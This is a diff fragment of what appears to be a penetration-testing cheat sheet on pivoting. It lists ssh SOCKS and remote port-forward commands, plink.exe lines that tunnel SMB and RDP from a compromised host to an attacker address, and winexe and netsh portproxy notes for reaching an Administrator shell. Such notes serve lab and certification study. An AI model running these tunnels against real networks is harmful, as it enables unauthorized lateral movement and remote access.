@@ -47,7 +47,8 @@
 |ssh -D 5000 -nNT user@pivoting host #SOCKS Proxy|
 |ssh -p 13339 -f -N j0hn@10.11.1.252  |
 |ssh -N -f -D 8888 -p 22000 j0hn@192.168.13.252 |
-|plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8 #winexe -U Administrator //127.0.0.1 "cmd.exe"|
+|plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8 #winexe -U Administrator //127.0.0.1 "cmd.exe|
+|plink.exe -l root -pw  -R 3389:127.0.0.1:3389 10.10.14.8 #rdesktop -U Administrator 127.0.0.1 |
 |ssh -nNT -R 3389:localhost:3389 user@pivot host #Remote Port Forward |
 |netsh interface portproxy add v4tov4 listenport=1111 Compromise Box=x.x.x.1 connectport=1111 connectaddress=Attacker|
 |netsh interface portproxy add v4tov4 listenport=1111 listenaddress=x.x.x.1 connectport=1111 connectaddress=x.x.x.10 |
